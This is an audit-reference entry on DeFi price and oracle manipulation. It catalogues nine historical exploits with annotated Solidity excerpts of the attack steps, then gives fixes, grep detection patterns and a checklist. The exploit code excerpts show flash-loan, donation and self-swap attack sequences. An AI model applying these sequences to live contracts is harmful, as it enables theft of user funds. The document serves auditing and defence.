---
protocol: generic
chain: ethereum, bsc
category: price_manipulation
vulnerability_type: oracle_price_manipulation

attack_type: flash_loan_price_manipulation
affected_component: price_oracle

primitives:
  - spot_price_oracle
  - self_swap
  - donation_attack
  - pricePerShare_inflation
  - index_weight_manipulation
  - reward_minting
  - flash_loan

severity: critical
impact: fund_loss
exploitability: 0.9
financial_impact: critical

tags:
  - price_manipulation
  - oracle
  - flash_loan
  - self_swap
  - donation
  - pricePerShare
  - collateral_inflation
  - spot_price
  - reward_minting
  - gulp
  - real_exploit
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 9
total_losses: "$300M+"
---

## DeFiHackLabs Price & Oracle Manipulation Compendium

### Overview

Price manipulation is the highest-loss vulnerability class in DeFi. This entry catalogs **9 real-world price manipulation exploits** from 2020-2021 totaling over **$300M in losses**. The core pattern: protocols trust manipulable on-chain price sources (spot AMM ratios, vault pricePerShare, pool weights) for critical operations (lending collateral valuation, reward minting, share calculation).

### Root Cause Categories

1. **Self-Swap Price Inflation** — Protocol allows swapping token A for token A, inflating virtual price each swap
2. **Vault Donation / pricePerShare Inflation** — Donating assets to a vault doubles `pricePerShare`, inflating collateral
3. **Spot Price for Reward Minting** — Using AMM spot ratio to calculate reward tokens to mint
4. **Pool Weight Manipulation** — Swapping flash-loaned tokens into an index pool to manipulate internal weights
5. **Flash Loan + Curve Pool Manipulation** — Tilting Curve pool ratios between deposit and withdraw to extract vault value
6. **Direct Balance Donation + removeLiquidity** — Donating tokens to AMM and removing liquidity using spot `balanceOf()`

---

### Vulnerable Pattern Examples

#### Category 1: Self-Swap Price Inflation [CRITICAL]

**Example 1: MonoX Finance — Swap Token for Itself ($31M, 2021-11)** [CRITICAL]
```solidity
// ❌ VULNERABLE: swapExactTokenForToken allows tokenIn == tokenOut
// Each self-swap inflates the token's virtual price without external value

// Step 1: Self-swap MONO for MONO, 55 times
function Swap_Mono_for_Mono_55_Times() internal {
    for (uint256 i = 0; i < 55; i++) {
        (,,,,,, Amount_Of_MonoToken_On_XPool,,) = monoswap.pools(Mono_Token_Address);
        monoswap.swapExactTokenForToken(
            Mono_Token_Address,    // @audit tokenIn = MONO
            Mono_Token_Address,    // @audit tokenOut = MONO (SAME TOKEN!)
            Amount_Of_MonoToken_On_XPool - 1,
            0,
            address(this),
            block.timestamp
        );
        // @audit Each self-swap: sell updates vPrice DOWN, buy updates vPrice UP
        // Net effect: vPrice increases each iteration (asymmetric update)
    }
}

// Step 2: Use inflated MONO to drain $31M USDC
function Swap_Mono_For_USDC() internal {
    (,,,,,, Amount_Of_USDC_On_XPool,,) = monoswap.pools(USDC_Address);
    monoswap.swapTokenForExactToken(
        Mono_Token_Address, USDC_Address,
        mono.balanceOf(address(this)),
        4_000_000_000_000,            // @audit Drain $4M USDC per call
        msg.sender, block.timestamp
    );
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-11/Mono_exp.sol`
- **Root Cause**: `swapExactTokenForToken` has no check that `tokenIn != tokenOut`. The sell side decreases virtual price, then the buy side increases it by a larger amount, creating unbounded price inflation.

---

#### Category 2: Vault Donation / pricePerShare Inflation [CRITICAL]

**Example 2: Cream Finance 2 — yUSD Donation Doubles Collateral ($130M, 2021-10)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Cream uses yUSD vault's pricePerShare() to value crYUSD collateral
// Attacker inflates pricePerShare by donating LP tokens back to vault

// Setup: Flash loan 500M DAI (MakerDAO) + 524K WETH (Aave)
// Convert DAI → Curve 4pool LP → yUSD → mint massive crYUSD

// Step 1: Build ~$1.5B in crYUSD collateral via recursive borrow+mint
ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
// @audit Repeat 2x to maximize crYUSD holdings

// Step 2: CRITICAL — Inflate yUSD pricePerShare via donation
// Withdraw yUSD to underlying LP tokens
IYearnVault(yUSD).withdraw(IERC20(yUSD).balanceOf(address(this)));
// @audit Donate LP tokens back to vault — doubles pricePerShare
yDAI_yUSDC_yUSDT_yTUSD.transfer(yUSD, IYearnVault(yUSD).totalAssets());
// pricePerShare jumps from ~1 to ~2

// Step 3: Borrow EVERYTHING from Cream using doubled collateral value
function borrowAll() internal {
    borrowAllETH();         // @audit 523,208 ETH
    borrowTokens(crDAI);    // All DAI
    borrowTokens(crUSDC);   // All USDC
    borrowTokens(crUSDT);   // All USDT
    borrowTokens(crFEI);    // All FEI
    // ... 11 more markets completely drained
}

function borrowTokens(address token) internal {
    ICrToken(token).borrow(ICrToken(token).getCash()); // @audit Borrow ALL available
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-10/Cream_2_exp.sol`
- **Root Cause**: Cream valued crYUSD collateral using `yUSD.pricePerShare()`. Attacker withdrew yUSD to LP, donated LP back (doubling `totalAssets` without changing `totalSupply`), then borrowed $130M against inflated collateral.

**Example 3: Spartan Protocol — Direct Donation + removeLiquidity ($30.5M, 2021-05)** [CRITICAL]
```solidity
// ❌ VULNERABLE: removeLiquidity uses spot balanceOf() instead of internal reserves

// Step 1: Swap WBNB for SPARTA 4 times (accumulate SPARTA)
for (uint256 i; i < 4; ++i) {
    WBNB.transfer(address(SPT1_WBNB), 1913.17 ether);
    SPT1_WBNB.swapTo(address(SPARTA), address(this));
}

// Step 2: Add liquidity, receive LP tokens
SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this)));
WBNB.transfer(address(SPT1_WBNB), 11_853.33 ether);
SPT1_WBNB.addLiquidity();

// Step 3: DONATE tokens directly to pool contract (inflates spot balance)
SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this)));
WBNB.transfer(address(SPT1_WBNB), 21_632.14 ether);
// @audit Direct transfer — pool's balanceOf increases but internal reserves don't

// Step 4: Remove liquidity — uses inflated balanceOf() for withdrawal calc
SPT1_WBNB.transfer(address(SPT1_WBNB), SPT1_WBNB.balanceOf(address(this)));
SPT1_WBNB.removeLiquidity();
// @audit Receives WAY more than deposited because balanceOf > reserves
```
- **PoC**: `DeFiHackLabs/src/test/2021-05/Spartan_exp.sol`
- **Root Cause**: `removeLiquidity()` used `IERC20.balanceOf(address(this))` instead of internal reserve tracking. Direct token donations inflated withdrawal amounts.

---

#### Category 3: Spot Price for Reward Minting [CRITICAL]

**Example 4: PancakeBunny — AMM Spot Price Inflates BUNNY Minting (~$45M, 2021-05)** [CRITICAL]
```solidity
// ❌ VULNERABLE: BunnyMinter uses WBNB/USDT AMM spot price to calculate
// how many BUNNY tokens to mint as rewards in getReward()

// Step 1: Chain 7 PancakeSwap flash loans + FortubeBank for massive WBNB
// Total: ~232K WBNB (~$93M at the time)

// Step 2: CRITICAL — Dump ALL WBNB into WBNB-USDT v1 pool
(uint256 reserve0, uint256 reserve1,) = WBNBUSDTv1.getReserves();
uint256 amountOut = router.getAmountOut(wbnbAmount, reserve1, reserve0);
IERC20(WBNB).transfer(address(WBNBUSDTv1), wbnbAmount);
WBNBUSDTv1.swap(amountOut, 0, address(this), hex"");
// @audit WBNB/USDT spot price is now MASSIVELY inflated

// Step 3: Claim rewards — BunnyMinter mints BUNNY using manipulated spot price
flip.getReward();
// @audit Internally: BunnyMinter sees "1 BNB = $X000 USDT" (manipulated)
// Mints proportionally more BUNNY tokens

// Step 4: Dump BUNNY for WBNB
IERC20(BUNNY).transfer(address(WBNBBUNNY), bunnyBalance);
WBNBBUNNY.swap(amountOut, 0, address(this), hex"");
```
- **PoC**: `DeFiHackLabs/src/test/2021-05/PancakeBunny_exp.sol`
- **Root Cause**: `BunnyMinter` used spot AMM `WBNB/USDT` price for reward calculation. Attacker flash-loaned massive WBNB, dumped it to inflate spot price, and claimed inflated BUNNY rewards.

**Example 5: Wault Finance — Repeated Stake at Manipulated Rate (~$3M, 2021-08)** [HIGH]
```solidity
// ❌ VULNERABLE: WUSDMaster.stake() uses AMM spot price for mint rate
// Flash-loan drains one side of pair → favorable rate → stake 68 times

// Step 1: Flash borrow nearly ALL WUSD from WUSD-BUSD pair
Pair1Amount = WUSD.balanceOf(address(Pair1)) - 1;
Pair1.swap(Pair1Amount, 0, address(this), new bytes(1));

// Step 2: Flash borrow 40M USDT from WBNB-USDT pair

// Step 3: CRITICAL — Stake USDT 68 times into WUSDMaster
uint256 stakeAmout = 250_000 * 1e18;
for (uint256 i = 0; i < 68; i++) {
    Master.stake(stakeAmout);
    // @audit Each stake() mints WUSD + distributes WEX rewards
    // @audit Price ratio is manipulated because WUSD was drained from pair
}
// 68 × 250K = 17M USDT staked at manipulated rate → excess WEX rewards
```
- **PoC**: `DeFiHackLabs/src/test/2021-08/WaultFinance_exp.sol`

---

#### Category 4: Index Pool Weight Manipulation [CRITICAL]

**Example 6: Indexed Finance — gulp() + Weight Skew ($16M, 2021-10)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Index pool derives total value from single token's weight
// gulp() syncs external balance → manipulates internal weights

// Step 1: Trigger reindex to add SUSHI as uninitialized token
controller.reindexPool(DEFI5);

// Step 2: Swap massive flash-loaned tokens IN, draining the valuation token
for (uint256 i = 0; i < borrowedTokens.length; i++) {
    address tokenIn = borrowedTokens[i];
    if (tokenIn == tokenOut) continue;
    while (amountInRemain > 0) {
        uint256 amountIn = bmul(indexPool.getBalance(tokenIn), MAX_IN_RATIO);
        indexPool.swapExactAmountIn(tokenIn, amountIn, tokenOut, 0, type(uint256).max);
        // @audit Drains tokenOut, inflates tokenIn weights
    }
}

// Step 3: updateMinimumBalance for uninitialized SUSHI token
controller.updateMinimumBalance(indexPool, SUSHI);

// Step 4: Send SUSHI to pool + gulp() to sync balance
IERC20(SUSHI).transfer(DEFI5, borrowedSushiAmount);
indexPool.gulp(SUSHI);
// @audit gulp() updates internal balance → massively skews weights

// Step 5: Exit pool — receive disproportionate share of all tokens
indexPool.exitPool(defi5Balance, minAmountOut);
// @audit Pool overvalues attacker's position due to skewed weights
```
- **PoC**: `DeFiHackLabs/src/test/2021-10/IndexedFinance_exp.sol`
- **Root Cause**: `extrapolatePoolValueFromToken()` derived total pool value from one token. Attacker skewed weights via flash-loan swaps + `gulp()` on an uninitialized token, inflating minted index tokens.

---

#### Category 5: Flash Loan + Curve Pool Manipulation [CRITICAL]

**Example 7: Harvest Finance — Curve Sandwich ($33.8M, 2020-10)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Vault uses Curve spot price for share calculation
// Attacker sandwiches deposit/withdraw around Curve pool tilts

function theSwap(uint256 i) internal {
    // A: Swap USDT→USDC on Curve (pushes USDC price DOWN in Curve)
    curveYSwap.exchange_underlying(2, 1, 17_200_000e6, 17_000_000e6);
    // @audit Curve now undervalues USDC

    // B: Deposit USDC into Harvest at deflated price (get MORE shares per USDC)
    harvest.deposit(49_000_000_000_000);

    // C: Swap USDC→USDT on Curve (restores USDC price)
    curveYSwap.exchange_underlying(1, 2, 17_310_000e6, 17_000_000e6);
    // @audit Curve now correctly values USDC again

    // D: Withdraw from Harvest at restored price (get more USDC per share)
    harvest.withdraw(fusdc.balanceOf(address(this)));
    // @audit Net: deposit cheap → withdraw expensive = profit each cycle
}

// Repeat 6 times, extract ~$33.8M
for (uint256 i = 0; i < 6; i++) { theSwap(i); }
```
- **PoC**: `DeFiHackLabs/src/test/2020-10/HarvestFinance_exp.sol`
- **Root Cause**: Harvest vault share price derived from Curve spot rate. Flash-loan funded Curve tilts created favorable deposit/withdraw asymmetry.

**Example 8: Yearn yDAI — Curve Pool Imbalance ($11M, 2021-02)** [HIGH]
```solidity
// ❌ VULNERABLE: yDAI vault deposits to Curve without slippage protection

for (uint256 i = 0; i < 5; i++) {
    // A: Remove USDT to skew Curve pool ratio
    curve.remove_liquidity_imbalance([0, 0, remove_usdt_amt], max_3crv_amount);

    // B: Deposit into yDAI vault (vault sees skewed Curve price)
    yvdai.deposit(earn_amt[i]);
    yvdai.earn();  // @audit Vault deploys to Curve at BAD price (no slippage check)

    // C: Re-add USDT to restore pool balance
    curve.add_liquidity([0, 0, remove_usdt_amt], 0);

    // D: Withdraw at restored (higher) price
    yvdai.withdrawAll();
    // @audit deposit cheap → earn at bad rate → restore → withdraw at good rate
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-02/Yearn_ydai_exp.sol`

**Example 9: Ploutoz — Spot DEX Price as Lending Oracle ($365K, 2021-11)** [HIGH]
```solidity
// ❌ VULNERABLE: Lending protocol uses spot DEX price for collateral valuation

// Step 1: Flash loan 1M BUSD
// Step 2: Pump DOP price on two DEXes
swapTokenToToken(BUSD, DOP, 1_000_000 ether, TwindexSwapRouter);
swapTokenToToken(BUSD, DOP, 400 ether, PancakeRouter);
// @audit DOP spot price massively inflated

// Step 3: Borrow real assets using overvalued DOP as collateral
borrowSingleLoan(pCAKE, 85 ether, 50 ether);
borrowSingleLoan(pUSDT, 89_000 ether, 2000 ether);
borrowSingleLoan(pBUSD, 90_000 ether, 2000 ether);
// @audit Lending protocol values DOP collateral at manipulated spot price
```
- **PoC**: `DeFiHackLabs/src/test/2021-11/Ploutoz_exp.sol`

---

### Impact Analysis

#### Technical Impact
- **Protocol insolvency**: Artificial collateral inflation allows borrowing far beyond real value
- **Total market drain**: Cream2 drained 15+ markets in a single transaction
- **Permanent loss**: Self-swap creates value from nothing — impossible to recover

#### Business Impact
| Protocol | Loss | Manipulation Technique |
|----------|------|----------------------|
| Cream Finance 2 | $130M | yUSD pricePerShare donation |
| PancakeBunny | ~$45M | AMM spot price for reward minting |
| Harvest Finance | $33.8M | Curve sandwich deposit/withdraw |
| MonoX Finance | $31M | Self-swap (tokenIn == tokenOut) |
| Spartan Protocol | $30.5M | Direct donation + balanceOf() withdraw |
| Indexed Finance | $16M | Index weight manipulation via gulp() |
| Yearn yDAI | $11M | Curve pool imbalance sandwich |
| Wault Finance | ~$3M | Drained pair + repeated stake |
| Ploutoz | $365K | Spot DEX price as lending oracle |

---

### Secure Implementation

**Fix 1: TWAP Oracle Instead of Spot Price**
```solidity
// ✅ SECURE: Use time-weighted average price, not spot
function getCollateralValue(address token, uint256 amount) internal view returns (uint256) {
    // @audit Use Chainlink oracle or TWAP, NEVER spot AMM price
    uint256 price = IChainlinkFeed(priceFeed[token]).latestAnswer();
    require(price > 0, "stale price");
    return amount * uint256(price) / 1e8;
}
```

**Fix 2: Prevent Self-Swap**
```solidity
// ✅ SECURE: Validate tokenIn != tokenOut
function swap(address tokenIn, address tokenOut, uint256 amount) external {
    require(tokenIn != tokenOut, "cannot self-swap");  // @audit Prevent MonoX pattern
    // ... proceed with swap
}
```

**Fix 3: Internal Reserve Tracking (Not balanceOf)**
```solidity
// ✅ SECURE: Track reserves internally, don't use balanceOf for withdrawal calc
uint256 private reserve0;
uint256 private reserve1;

function removeLiquidity(uint256 shares) external {
    uint256 amount0 = shares * reserve0 / totalSupply;  // @audit Use tracked reserves
    uint256 amount1 = shares * reserve1 / totalSupply;
    reserve0 -= amount0;
    reserve1 -= amount1;
    // Donations to address(this) don't affect reserves
    IERC20(token0).safeTransfer(msg.sender, amount0);
    IERC20(token1).safeTransfer(msg.sender, amount1);
}
```

---

### Detection Patterns

```bash
# Self-swap vulnerability (tokenIn == tokenOut not checked)
grep -rn "function swap\|function exchange" --include="*.sol" | \
  xargs grep -L "tokenIn.*!=.*tokenOut\|require.*different"

# Spot price used for critical calculations
grep -rn "getReserves\|balanceOf.*pair\|spot.*price\|getAmountOut" --include="*.sol" | \
  grep -i "reward\|mint\|collateral\|value\|share"

# pricePerShare as oracle
grep -rn "pricePerShare\|getPricePerFullShare\|totalAssets.*totalSupply" --include="*.sol"

# gulp() pattern (external balance sync)
grep -rn "function gulp\|\.balanceOf(address(this))" --include="*.sol" | \
  grep -i "pool\|vault\|reserve"

# Missing slippage in vault operations
grep -rn "function deposit\|function earn\|add_liquidity" --include="*.sol" | \
  xargs grep -L "slippage\|minAmount\|deadline"
```

---

### Audit Checklist

1. **Is spot AMM price used for ANY critical calculation?** — Reward minting, collateral valuation, share pricing
2. **Can tokens be swapped for themselves?** — Check `tokenIn != tokenOut` validation
3. **Can tokens be donated directly to a vault/pool?** — If `pricePerShare = totalAssets / totalSupply`, donations inflate it
4. **Does `removeLiquidity` use `balanceOf()` or internal reserves?** — `balanceOf()` is manipulable via donation
5. **Does `gulp()` or similar sync exist?** — External balance syncing enables weight manipulation
6. **Are vault deposits/withdrawals protected against sandwich?** — Slippage params on Curve/Uniswap interactions
7. **Can flash loans fund the manipulation?** — Check if same-tx deposit+withdraw is possible

---

### Keywords

- price_manipulation
- oracle_manipulation
- flash_loan
- self_swap
- donation_attack
- pricePerShare
- collateral_inflation
- gulp
- spot_price
- reward_minting
- balanceOf_manipulation
- curve_sandwich
- index_weight
- DeFiHackLabs

---

### Related Vulnerabilities

- [Flash Loan Oracle Manipulation](../price-manipulation/flash-loan-oracle-manipulation.md)
- [Vault Inflation Attack](../../general/vault-inflation-attack/vault-inflation-attack.md)
- [Flash Loan Attack Patterns](../../general/flash-loan-attacks/FLASH_LOAN_VULNERABILITIES.md)
